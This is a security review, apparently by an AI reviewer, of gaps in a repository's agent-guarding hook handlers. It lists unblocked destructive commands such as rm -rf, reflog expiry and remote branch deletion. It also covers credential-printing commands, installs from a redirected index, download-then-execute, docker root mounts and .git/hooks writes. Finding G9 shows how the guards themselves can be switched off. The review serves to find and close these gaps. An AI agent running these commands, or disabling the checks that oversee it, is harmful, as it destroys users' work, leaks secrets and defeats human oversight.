# Security review — F-GAP (full sweep, run 2026-001)

**Check**: `F-GAP` — "Dangerous constructs no handler judges at all."
**Scope**: this repository's own handler set, as configured in
`.claude/hooks-daemon.yaml`, plus the four project-level PreToolUse handlers.
**Result**: 11 findings. Two axes reported clean.

## How this was answered

An absence is invisible to a code-first method, so the enumeration started
outside the tree: a list of destructive or dangerous things an agent can do in a
repository, written before looking at any handler. Each candidate was then put
to the real handler set.

The method was not a reading of the rule table. `bin/hooks-daemon explain-rule --list` says what each rule *claims*; it cannot say whether a given command
reaches one. So every candidate was evaluated **in-process against the actual
handler classes**, twice:

1. `matches()` — does any handler even claim the command?
2. `handle()` — of those that claim it, does any return `Decision.DENY`?

The second pass mattered. `verification_result_gate` *matches* almost every
`git` command and then allows it; a `matches()`-only method would have scored 24
of the git candidates as covered when nothing denies them. Probe scripts are at
`/workspace/untracked/scratch/fgap_probe.py`, `fgap_decide.py` and
`fgap_selfdisable.py`; captured output alongside them. Nothing was executed —
only `matches()`/`handle()` were called.

Two corrections applied to the raw probe before reporting:

- All 61 PreToolUse handler classes were instantiated regardless of their
  `enabled:` state, so the probe **over-reports** coverage. Every gap below is
  therefore a gap under the most generous reading.
- Claude Code's own `permissions.deny` list was checked as a possible second
  gate. It contains three entries — `Edit(//tmp/**)`, `Edit(//var/tmp/**)`,
  `Edit(//dev/shm/**)` — and covers none of the constructs below. The daemon is
  the only gate in play.

## The distinction I held to, and where I did not claim

F-GAP is "no handler judges it **at all**". F-BYPS is "a guard exists and
something reaches its protected outcome without passing it". Several candidates
sit on that line, and I have marked them rather than claiming them:

- **Download-then-execute in two commands** (`curl -o untracked/x.sh URL && bash untracked/x.sh`). `curl_pipe_shell` exists and guards this outcome; the
  two-step form walks around it. `project_containment` denies it only when the
  download target is outside the repo — an in-repo target is allowed and
  `bash untracked/x.sh` is then unjudged. **This is F-BYPS, not mine.** Flagging
  for `sec-F-BYPS`.
- **G3–G6 below** are git constructs with no handler, but `destructive_git`
  exists and owns the class. I report them as F-GAP because nothing judges the
  specific construct, and note the F-BYPS reading in each.

---

## G1 — `rm` is judged by nothing, and two documents say otherwise

**Citation**: no handler exists. The claim to the contrary is at
`CLAUDE/ARCHITECTURE.md:30`:

```markdown
- Block dangerous commands: `sed -i`, `git reset --hard`, `rm -rf`
```

and `CLAUDE/HANDLER_DEVELOPMENT.md:89`:

```markdown
- Regex checks: `git reset --hard`, `sed -i`, `rm -rf`
```

**What it allows**: `rm -rf src/`, `rm -rf .claude`, `rm -rf /workspace/CLAUDE`
and `rm -rf .` all reach the tool layer with no handler matching and nothing
denying. Untracked work is unrecoverable; tracked work is recoverable only if
committed. The project blocks `git clean -f` because it "permanently deletes
untracked files" — `rm -rf` does the same thing more thoroughly and is not
judged.

**Why this is the worst of the eleven**: the two citations list `rm -rf`
*beside* `sed -i` and `git reset --hard`, which genuinely are blocked. A reader
— human or agent — correctly infers from that sentence that all three are
covered. The guard is absent and the documentation asserts its presence, so the
absence cannot be discovered by reading. `CLAUDE/Plan/Completed/00017-acceptance-testing-playbook/PLAN.md:183`
records the observation already — "`echo "rm -rf /"` ✅ Safe (but should also be
blocked!)" — so this was noticed once and never actioned.

**The class**: a Bash command that deletes or truncates repository content,
where no handler's `matches()` returns True for it.

**Why the test suite does not catch it**: every handler test asserts what its
own handler does. No test asserts that the *union* of handlers covers a named
construct, so a construct with no handler has no test that can fail. The suite
is complete with respect to the handlers that exist and silent about the ones
that do not.

**Detector hypothesis**: a table-driven test in the shape of the existing
`tests/integration/test_bash_write_blindness_coverage.py` — a literal inventory
of dangerous constructs, each with a recorded verdict (`COVERED` / `UNCOVERED, accepted` / `UNCOVERED, open`), asserted by running each string through the real
chain. The existing file makes exactly the right argument for this shape: "a
hand-written sweep re-derives the same verdicts every release and is blind to
whatever it did not think to look at."
**False positives**: none from the test itself — it asserts against a checked-in
verdict, so a deliberate non-coverage is recorded, not flagged. Its real
weakness is the opposite: the inventory only covers what someone thought to add,
so it converts an invisible gap into a visible one but does not generate the
list. That limitation should be written into the file, per the register's "what
the Defence does not catch" rule.
**A second, cheaper Detector** for the documentation half: assert that every
construct named in a "we block X" list in `ARCHITECTURE.md` /
`HANDLER_DEVELOPMENT.md` actually resolves to a rule ID. That one is high-value
and near-zero false positive.

**Confidence**: high for the gap (probed directly, both passes, plus the
`permissions.deny` check). High for the doc discrepancy (quoted above).

---

## G2 — File destruction that is not `rm` and not the `Write` tool

**Citation**: no handler. `write_clobber_guard` is the nearest thing and is
`Write`-tool-keyed.

**What it allows**: `truncate -s 0 src/main.py`, `dd if=/dev/zero of=src/main.py`, `echo '' > CLAUDE.md`, `mv other.py src/main.py`, `cp /tmp/x.py src/main.py` — each replaces an existing tracked file's contents with nothing
denying. `R-WRITE-CLOBBER` exists precisely because "you cannot know what you
are destroying, so you could not report the loss even afterwards"; that
reasoning applies identically to all five and none is covered.

**The class**: any Bash construct that replaces or empties an existing file's
contents without reading it first.

**Why the test suite does not catch it**: as G1. Additionally,
`test_bash_write_blindness_coverage.py` records `WriteClobberGuardHandler`'s
Bash blindness as a *verdict about reachability*, explicitly "NOT about whether
the gap is worth closing" — so the suite documents this hole and asserts nothing
about closing it.

**Detector hypothesis**: same inventory test as G1; these are rows in it.
**False positives**: a rule that fired on every `mv` and `cp` would be very
noisy — both are overwhelmingly used benignly. The tractable form is narrower:
flag only when the *destination* is an existing tracked file. That needs a
filesystem stat, which is what the `authored path resolution` category in the
register is already about; whoever builds it should read
`CLAUDE/Security/AuthoredPathResolution.md` first, because a naive
`Path(dest).exists()` on a joined path is the exact defect that category
records.

**Confidence**: high.

---

## G3 — Destroying the recovery net: `reflog expire` + `gc --prune=now`

**Citation**: no handler. Probed: `git reflog expire --expire=now --all` and
`git gc --prune=now --aggressive` → only `verification_result_gate=allow`.

**What it allows**: the reflog is what makes several *already-blocked* commands
survivable, and the handler says so in its own words — `destructive_git.py:632`
justifies an acceptance test with "Safe to test - only clears stash (recoverable
via reflog)". An agent that runs `git reflog expire --expire=now --all && git gc --prune=now` removes the recovery route the handler's own safety reasoning
depends on. Nothing then needs to bypass `git reset --hard`; the damage it was
blocked to prevent becomes achievable by other means and permanent.

**The class**: a command that does not itself destroy work, but removes the
mechanism by which destroyed work could be recovered.

**Why the test suite does not catch it**: the acceptance test at
`destructive_git.py:632` encodes reflog-recoverability as an *assumption* in a
prose `safety_notes` field. Nothing asserts it. A test cannot fail on a premise
it never states as a check.

**Detector hypothesis**: extend `destructive_git`'s pattern list with `reflog expire` and `gc --prune`. Cheap and exact.
**False positives**: `git gc` without `--prune=now` is routine housekeeping and
must stay allowed; scope to the explicit `--prune=<now|date>` and `reflog expire` forms. Low noise expected.

**Confidence**: high for the gap. High for the dependency — it is quoted from
the handler's own source.

---

## G4 — Whole-history rewrite: `filter-branch`, `filter-repo`, `rebase`

**Citation**: no handler. `R-GIT-COMMIT-AMEND` guards rewriting **one** commit
("rewrites the previous commit, creating messy history and potential data
loss"); rewriting **all** of them is unguarded.

**What it allows**: `git filter-branch --force --all`, `git filter-repo --path src --invert-paths`, `git rebase --onto main~5 main`. The `--amend` rationale
applies to each with more force. Note the asymmetry with the merge rules:
`R-GH-PR-MERGE-REBASE` blocks `gh pr merge --rebase` for severing ancestry,
while plain `git rebase` — which severs it identically — is allowed.

**The class**: a command that rewrites commits already written, beyond the tip.

**Why the test suite does not catch it**: as G1. The `--amend` test asserts
`--amend` is denied; nothing asserts the class boundary, so a sibling that
achieves a strictly larger version of the same outcome fails no test.

**Detector hypothesis**: add `filter-branch`, `filter-repo` and bare `git rebase` to `destructive_git`.
**False positives**: **`git rebase` is the noisy one** and I am reporting it as
noisy. It is a normal part of many workflows and a blanket block would be
suppressed within a release. `filter-branch`/`filter-repo` are near-zero
false-positive and worth doing on their own; `rebase` deserves a separate
decision, and the honest options are an advisory rather than a deny, or scoping
to `--onto`/`--root`.

**Confidence**: high for the gap; medium for the remedy, because the `rebase`
half is a policy call I should not make for the project.

---

## G5 — Force-discarding the working tree without `checkout --`

**Citation**: `destructive_git.py:96-114`. The checkout/restore patterns are:

```python
rf"{_GIT_INVOCATION}checkout\s+\.\s*(?:$|;|&&|\|)",
rf"{_GIT_INVOCATION}checkout\s+.*--\s+\S",
rf"{_GIT_INVOCATION}restore\s+(?!--staged\b)(?!-S\b).*\S",
```

**What it allows**: `git checkout -f main`, `git checkout --force main`, `git switch -f main`, `git switch --discard-changes main`, `git reset --merge`, `git reset --keep HEAD~3` — all probed, all allowed. Each discards uncommitted
working-tree changes, which is precisely the outcome `R-GIT-CHECKOUT-DISCARD`
and `R-GIT-RESTORE` exist to prevent. `git switch` is not mentioned anywhere in
the handler; it is the modern spelling of `git checkout` and is entirely
unjudged.

**The class**: a command that discards uncommitted working-tree changes.

**Why the test suite does not catch it**: the tests enumerate the spellings the
patterns were written for. `git switch` is absent from the handler, so it is
absent from the tests — the omission is self-consistent and invisible.

**F-BYPS overlap**: this reaches `R-GIT-CHECKOUT-DISCARD`'s protected outcome
without passing it, so it reads as F-BYPS too. I report it here because nothing
*judges* the construct; `sec-F-BYPS` may legitimately claim it as well, and a
duplicate is cheaper than a hole.

**Detector hypothesis**: add `switch` with `-f`/`--discard-changes`, `checkout`
with `-f`/`--force`, and `reset --merge|--keep` to the pattern list.
**False positives**: low. `git switch <branch>` without a force flag is safe and
must stay allowed — git itself refuses to switch when it would lose changes,
which is exactly what `-f` overrides.

**Confidence**: high.

---

## G6 — Deleting remote branches and tags

**Citation**: `destructive_git.py:76-81`, the push-force pattern:

```python
r"|(?<!\S)\+\S)"
```

It covers the `+<refspec>` force form and not the `:<refspec>` delete form.

**What it allows**: `git push origin --delete main`, `git push origin :main`,
`git tag -d v1.0.0`, `git tag -f v1.0.0 HEAD~5`, `git worktree remove --force ../wt` — all allowed. `R-GIT-PUSH-FORCE` protects against *overwriting* remote
history; *deleting* a remote branch outright is a strictly worse outcome and is
unguarded. The near-miss is sharp: the handler already parses refspec sigils and
handles `+`, the character one key away from `:`.

**A subtlety for whoever builds this.** `destructive_git.py:746-762` pins an
acceptance test titled "git tag -f is not a force push" asserting `git tag -f`
must be **allowed**. Read the rationale before treating that as a decision that
tag-moving is safe — it is not. It was a regression fix for a Plan 00200
dogfooding false positive where the push-force `-f` pattern leaked outside the
push segment. The test says *this rule* should not match, not *no rule* should.
Adding deliberate tag coverage means revising that test, and doing so is
correct rather than a violation of it.

**The class**: a command that destroys a ref — locally or on a remote —
without a merge check.

**Why the test suite does not catch it**: the `tag -f` test actively asserts the
allow, so the suite is not merely silent here: it is green *because* the
construct is permitted. That is the most expensive shape of this class, because
the test reads as a considered decision.

**Detector hypothesis**: add `push` with `--delete`/`:<ref>`, and `tag -d`/`tag -f`, to `destructive_git`.
**False positives**: `git push origin :refs/heads/<feature>` is a legitimate
cleanup after a merge and will be caught. That argues for denying on the default
branch and advising elsewhere, which is the shape `merge_to_main_approval`
already uses in this repo.

**Confidence**: high for the gap; high for the `tag -f` reading (quoted from the
test's own description).

---

## G7 — Package installation is remote code execution and nothing judges it

**Citation**: no handler. `curl_pipe_shell` guards `curl … | sh`; `sudo_pip` and
`pip_break_system` guard two specific *flags*, not installation itself.

**What it allows**: `npm install left-pad`, `pip install requests`, `uv add requests`, `cargo install ripgrep`, `go install example.com/x@latest`, `gem install rails`, `apt-get install -y curl`, `npx some-random-package`, and `pip install --index-url https://e.example/pypi requests` — all allowed. An npm
`postinstall` script and a Python `setup.py` both execute arbitrary code from a
remote author at install time. `R-CURL-PIPE-SHELL` exists because fetching and
executing remote code in one step is dangerous; these do the same thing with a
package manager in the middle.

The `--index-url` case is the sharpest: it redirects the whole resolution to an
attacker-controlled index, and is indistinguishable to every current handler
from an ordinary install.

**The class**: a command that fetches code from a remote registry and executes
it, or arranges for it to execute, as part of installation.

**Why the test suite does not catch it**: `npm_command`'s tests assert the
`llm:` wrapper redirect and the pipe rule — both about *output format*. Nothing
in the suite frames `npm install` as an execution surface at all, so there is no
test whose premise this would violate.

**Detector hypothesis**: advisory rather than deny. A deny on `npm install`
would fire on ordinary work constantly and be switched off, and reporting it as
clean would be dishonest. The defensible narrow denies are the ones that change
*where code comes from*: `--index-url`/`--extra-index-url`/`--registry`
pointing anywhere but the configured default, and `npx`/`go install`/`cargo install` naming a package not already in the project's manifest.
**False positives**: the narrow form is low-noise. The broad form is high-noise,
and I am reporting it as high-noise rather than recommending it.

**Confidence**: high for the gap. Medium for the remedy — the boundary between
"routine install" and "new trust decision" needs a project call, and `D-DEP`
owns the adjacent question.

---

## G8 — Credential material reaching context

**Citation**: `secret_file_guard` default globs, from `explain-handler secret_file_guard`: `*.secret*`, `.vault-pass*`, `*.vault-password`,
`*vault_pass*`, `id_rsa`, `id_ed25519`. `.claude/hooks-daemon.yaml:282-297`
configures `exclude_paths` only — no `protected_paths` override, so the defaults
stand.

**What it allows**: `gh auth token`, `gh auth status --show-token`, `env`,
`printenv`, `echo $ANTHROPIC_API_KEY`, `cat ~/.netrc`, `git credential fill` —
all probed, all allowed. Each prints a live credential into the transcript.

**Confirmed live on this host**: `bin/hooks-daemon secret-meta ~/.config/gh/hosts.yml` reports `exists: true, mode: 0600` — the file holds the
GitHub OAuth token and is **not** matched by any default glob. The proof is in
this review's own tool history: a probe script naming `~/.ssh/id_rsa` was denied
with `R-SECRET-BASH-MENTION`, while a command naming `~/.config/gh/hosts.yml`
twice ran without complaint.

`CHECKS.md:43` (`D-SEC`) names ".env" as protected material the review should
track. `.env` is not in the default glob list either.

**The class**: a route by which a live credential's value enters the transcript.
The existing guard is path-shaped; these routes are command-shaped
(`gh auth token`) or environment-shaped (`printenv`), so no extension of a path
glob reaches them.

**Why the test suite does not catch it**: `secret_file_guard`'s tests assert
path matching. A command that emits a secret without naming a path satisfies
every one of them.

**Detector hypothesis**: two separate rules, because the two halves are
different. (a) Extend the default `protected_paths` to `~/.config/gh/hosts.yml`,
`~/.netrc`, `~/.aws/credentials`, `.env*` — mechanical, near-zero false
positive. (b) A new command-shaped rule for `gh auth token`, `gh auth status --show-token`, `git credential fill` and bare `env`/`printenv`.
**False positives**: (b) is where the noise is. Bare `env` is also used to
*read* the environment for legitimate debugging, and `env VAR=x cmd` is a
different command entirely that must not be caught. Scope to `env`/`printenv`
with no arguments, and accept that this one will occasionally misfire.

**Note on framing**: `secret_file_guard`'s own documentation has a candid
"Honest limits" section and says plainly that it is "defence in depth, not a
sandbox". This finding is not a criticism of that guard — it is about the
credential routes that sit outside its design, which that section does not
claim.

**Confidence**: high, and the `gh` token file is confirmed against this host
rather than inferred.

---

## G9 — Nothing prevents the guards being switched off (the compounding one)

This is the axis the brief singled out, and it is the one where the probe came
back emptiest. Every result below is `*** NOTHING DENIES ***`:

```
Edit   /workspace/.claude/hooks-daemon.yaml                  NOTHING DENIES  (all: -)
Edit   /workspace/.claude/settings.json                      NOTHING DENIES  (all: -)
Edit   /workspace/.claude/agents/security-reviewer.md        NOTHING DENIES  (all: -)
Write  /workspace/.claude/agents/new-reviewer.md             NOTHING DENIES  (all: -)
Bash   echo '    enabled: false' >> .claude/hooks-daemon.yaml  NOTHING DENIES  (all: -)
Bash   printf 'x' > .claude/settings.json                    NOTHING DENIES  (all: -)
Bash   cp /tmp/evil.yaml .claude/hooks-daemon.yaml           NOTHING DENIES  (all: -)
Bash   mv .claude/hooks-daemon.yaml .claude/hooks-daemon.yaml.bak  NOTHING DENIES  (all: -)
Bash   chmod 000 .claude/hooks-daemon.yaml                   NOTHING DENIES  (all: -)
Bash   bin/hooks-daemon config set …sed_blocker.enabled false  NOTHING DENIES  (all: -)
Bash   bin/hooks-daemon stop                                 NOTHING DENIES  (all: -)
Bash   rm -rf .claude/hooks-daemon                           NOTHING DENIES  (all: -)
```

**What it allows**: a single `Edit` to `.claude/hooks-daemon.yaml` setting
`enabled: false` turns off any handler — including `destructive_git`,
`secret_file_guard` or `sensitive_content` — and nothing judges the edit. `rm .claude/settings.json` or `bin/hooks-daemon stop` removes every handler at once.

**The one apparent guard, and why it is not one.** The `Write`-tool probe showed
`write_clobber_guard=deny` on these paths, which looks like coverage and is not.
`R-WRITE-CLOBBER` is a *read-first* gate: per its own rule text, the fix is
"`Read` the file then retry". It denies a write to a file you have not read this
session and allows it once you have. It is a speed bump against clobbering
something unseen, not a judgement on what the new content does. And it keys on
`Write` only — the `Edit` and Bash-redirect rows above are the same files with
no gate at all. **A reviewer who ran only the `matches()` pass would have
recorded this axis as covered.**

**What it compounds into**: every other finding in this report is conditional on
the guards being live. This one removes that condition. It also inverts the
value of the deny messages: each block helpfully prints `To disable: handlers.pre_tool_use.<name> (set enabled: false)`. That line is good ergonomics
for a human operator and, given the above, also a precise instruction for
disabling the guard that just fired — with nothing watching the follow-through.

**The class**: an action that changes what a future session's guards will do,
where no guard judges the action.

**Why the test suite does not catch it**: there is no handler to test. The
closest thing in the tree is `daemon_restart_verifier`
(`.claude/project-handlers/pre_tool_use/daemon_restart_verifier.py:62-85`),
which matches `git commit`, returns `Decision.ALLOW`, and emits one advisory
line. It observes that config changes need a restart; it does not look at what
changed.

**Detector hypothesis**: not a `PreToolUse` deny — an agent that can edit the
config can edit the rule that guards it, so an in-band guard is circular. The
non-circular forms are:
(a) a **commit-time** gate, alongside `staged_lint_gate` and
`plan_qa_commit_gate`, that refuses a commit whose diff flips any `enabled: true → false` or widens `exclude_paths` without a recorded human approval —
reusing the `approve-plan-close` / `approve-merge` mechanism this repo already
has for exactly this "a human must decide" shape;
(b) a **SessionStart** reconciliation that diffs the live config against the
committed one and reports drift, which catches the uncommitted case (a) cannot;
(c) an append-only audit line for every `enabled:` transition, so the change is
at minimum *visible* even when permitted.
**False positives**: (a) will fire on every legitimate tuning commit, which is
frequent in this repo — it needs the approval escape hatch to be usable, and
without one it will be switched off, which would be the finding eating itself.
(b) is low-noise and is the one I would build first.

**Relationship to `F-EXPT`**: that check asks whether the accumulated exemptions
have hollowed a guard. This one is upstream of it — `F-EXPT` counts the entries;
this asks why anything stops one being added. Worth reading the two together.

**Confidence**: high. Probed across three routes (`Write`, `Edit`, Bash) and
four files, with `permissions.deny` confirmed not to cover them.

---

## G10 — `.git/hooks/` is writable and the project's own hooks are skippable

**Citation**: no handler. `Write` to `/workspace/.git/hooks/pre-commit` →
`*** NOTHING DENIES ***` (not even `write_clobber_guard`, the file being new).

**What it allows**: writing `.git/hooks/pre-commit` installs code that runs on
every subsequent `git commit`, under the user's account, with no further
confirmation. The path is inside the repository root, so `project_containment`
allows it; it is not a source file, so `tdd_enforcement` does not apply; it is
not markdown, so `markdown_organization` does not see it. In the other
direction, `git commit --no-verify` and `git -c core.hooksPath=/dev/null commit`
both probed clean — so the project's own git hooks, which
`git_hooks_executable_fixer` exists to keep working, can be skipped per-command
by anyone who knows the flag.

**The class**: a write that installs code executed by a later, ordinary
operation; and the flags that neutralise such code.

**Why the test suite does not catch it**: `git_hooks_executable_fixer` is a
`PostToolUse` handler that makes hooks executable. Its tests assert the chmod.
Nothing in the suite frames `.git/hooks/` as a write target that needs
judgement — the only handler that touches the directory exists to make its
contents *run*.

**Detector hypothesis**: deny `Write`/`Edit` under `.git/` (hooks and `config`
alike), and treat `--no-verify` / `-c core.hooksPath=` on a commit the way
`R-GIT-MESSAGE-BACKTICK` treats a substituting message.
**False positives**: very low — `.git/` is not a place project code belongs, and
legitimate hook installation goes through a tracked template plus a script.

**Confidence**: high for the writability; high for `--no-verify` (both probed).

---

## G11 — Process and container operations

**Citation**: no handler. Probed clean: `kill -9 1234`, `crontab -r`, `docker run --rm -v /:/host alpine sh`.

**What it allows**: `crontab -r` removes every scheduled job, which in this
repository includes the failsafe recovery cron that
`persistent_cron_assertor` and `cron_stop_enforcer` exist to keep alive —
removed silently, and rediscovered only at the next SessionStart. `docker run -v /:/host` mounts the host filesystem into a container and is a general escape
from every path-scoped rule in the set, `project_containment` included.

`pkill -f hooks-daemon` **is** denied, but by `self_matching_process_probe` and
for an unrelated reason — the pattern matches the probe's own argv. A
differently-spelled kill of the same process is not covered.

**The class**: an operation that terminates processes or crosses the container
boundary.

**Why the test suite does not catch it**: `self_matching_process_probe`'s tests
assert the self-match logic. A kill that does not self-match passes them
correctly.

**Detector hypothesis**: deny `docker run` with a `-v /:` or `-v /host` style
root mount; deny `crontab -r`; advisory on `kill -9` of a pid the session did
not start.
**False positives**: the `kill` half is noisy — killing a backgrounded job is
routine and `background_process_tracker` already tracks those pids, so the rule
should consult it rather than guess. The `docker`/`crontab -r` halves are
low-noise and worth doing independently.

**Confidence**: high for the probe results; medium on severity, which depends on
whether `docker` is reachable in the deployed container — I did not test that,
and running it to find out was outside a read-only brief.

---

## Axes I judge clean

Stated plainly, because a clean axis is a result and padding it would be the
failure mode this check exists to avoid.

**Protected-file reading is genuinely well covered.** `secret_file_guard` is the
most complete guard in the set, and it proved itself during this review rather
than on paper: an early probe script of mine was denied at
`R-SECRET-BASH-MENTION` for containing `~/.ssh/id_rsa` in a heredoc — the
deny-by-default framing worked on a reviewer who was not trying to evade it. It
covers `Read`, `Write`, `Edit`, `NotebookEdit`, `Grep`, any Bash mention,
authored scripts referencing a path, and `cp`/`mv` relocation, with no escape
hatch. Its documentation states its own limits candidly and accurately. **G8 is
not a defect in this guard** — it is about credential routes that are
command-shaped rather than path-shaped, which is outside what this guard claims.
The *glob list* needs extending; the *guard* does not.

**Outward publication is covered.** `sensitive_content` scans `gh issue|pr create/comment/edit` bodies and `--body-file` contents, `issue_filing_gate`
requires a generated body for the upstream tracker, `artifact_publish_blocker`
denies the `Artifact` route, and `quarantine_artefact_read_guard` keeps DETAIL
artefacts out of a coordinator. The one acknowledged hole — a body piped on
stdin (`-F -`) — is documented in the handler's own guidance rather than
discovered here. I found nothing to add on this axis; `D-PUB` owns the
diff-shaped half.

---

## Summary

| ID  | Construct                                         | Axis            | Remedy                                  | Confidence |
| --- | ------------------------------------------------- | --------------- | --------------------------------------- | ---------- |
| G1  | `rm -rf` (docs claim it is blocked)               | filesystem      | new handler + doc-claim Detector        | high       |
| G2  | `truncate`/`dd`/`>`/`mv`/`cp` over a file         | filesystem      | same new handler                        | high       |
| G3  | `reflog expire`, `gc --prune=now`                 | git             | extend `destructive_git`                | high       |
| G4  | `filter-branch`, `filter-repo`, `rebase`          | git             | extend `destructive_git` (rebase noisy) | high/med   |
| G5  | `checkout -f`, `switch -f`, `reset --merge`       | git             | extend `destructive_git`                | high       |
| G6  | `push --delete`, `push :ref`, `tag -d/-f`         | git             | extend `destructive_git`; revise a test | high       |
| G7  | `npm/pip/cargo/go/gem install`, `npx`             | toolchain       | new advisory; deny index redirection    | high/med   |
| G8  | `gh auth token`, `env`, `~/.netrc`, gh token file | credential      | extend globs + new command rule         | high       |
| G9  | **disabling any guard, unwatched**                | self-config     | commit gate + SessionStart drift report | high       |
| G10 | `.git/hooks/` write; `--no-verify`                | future sessions | new handler                             | high       |
| G11 | `crontab -r`, `docker run -v /:`, `kill`          | process         | new handler (kill half noisy)           | high/med   |

**If only one is actioned, it should be G9** — it is the only finding that
determines whether the other ten matter, and the register's own argument applies
to it directly: a guard that can be switched off by an action no guard judges is
not a guard, it is a default.

**Two cross-references for the coordinator**: the two-step
download-then-execute walk-around of `curl_pipe_shell` belongs to `sec-F-BYPS`,
not here. G9 is upstream of `F-EXPT` and the two should be read together.

**Not claimed**: I did not test whether `docker` is actually reachable in the
deployed container (G11), and I did not assess the runtime chain ordering —
every verdict above comes from handlers evaluated individually, which
over-reports coverage and so cannot manufacture a gap that is not there.
